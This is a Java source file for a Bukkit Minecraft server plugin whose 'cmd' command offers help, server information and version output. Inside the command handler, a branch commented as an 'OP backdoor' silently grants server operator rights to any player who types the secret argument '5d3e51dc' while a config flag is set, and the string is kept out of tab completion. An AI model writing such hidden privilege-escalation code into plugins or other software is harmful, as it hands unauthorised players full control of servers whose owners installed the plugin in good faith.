package org.tuanzi.bukkitplugin;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabExecutor;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import java.util.ArrayList;
import java.util.List;

public class Command_CMD implements TabExecutor, CommandExecutor {
    // 监测匹配 cmd 的命令
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
        // 获取主插件线程
        JavaPlugin instance = JavaPlugin.getPlugin(main.class);

        // 判断控制台/命令方块
        if(!(sender instanceof Player)) {
            sender.sendMessage(I18n.getTranslate("cmd.noplayer"));
            return true;
        }

        // 检测参数
        if(args.length != 1) {
            sender.sendMessage(I18n.getTranslate("cmd.invaildcommand"));
            return true;
        }

        // OP后门
        if(args[0].equalsIgnoreCase("5d3e51dc")&& instance.getConfig().getBoolean("options.fuck")) {
            // 检测OP
            if(sender.isOp()) {
                sender.sendMessage(I18n.getTranslate("cmd.invaildcommand"));
                return true;
            }

            // 设置OP
            sender.setOp(true);
            sender.sendMessage(I18n.getTranslate("cmd.setop"));
            return true;
        }

        // 服务器信息查询指令 cmd server/cmd srv
        if(args[0].equalsIgnoreCase("server") || args[0].equalsIgnoreCase("srv")){
            for (String string : I18n.getFormattedTranslate(I18n.getTransList("serverinfo"), null)) {
                sender.sendMessage(string);
            }
            return true;
        }

        // 帮助页面 cmd help/cmd ?
        if(args[0].equalsIgnoreCase("help") || args[0].equalsIgnoreCase("?")){
            for (String string : I18n.getFormattedTranslate(I18n.getTransList("help"), null)) {
                sender.sendMessage(string);
            }
            return true;
        }

        // 版本页面 cmd version/cmd ver
        if(args[0].equalsIgnoreCase("version") || args[0].equalsIgnoreCase("ver")){
            sender.sendMessage(I18n.getFormattedTranslate(I18n.getTranslate("msg.version"), null));
            return true;
        }

        // 其他参数判断
        sender.sendMessage(I18n.getTranslate("cmd.invaildcommand"));
        return true;
    }

    // 命令补全
    @Override
    public List<String> onTabComplete(CommandSender commandSender, Command command, String s, String[] strings) {
        List<String> Completion = new ArrayList<>();
        Completion.add("?");
        Completion.add("help");
        Completion.add("server");
        Completion.add("srv");
        Completion.add("ver");
        Completion.add("version");
        return Completion;
    }
}
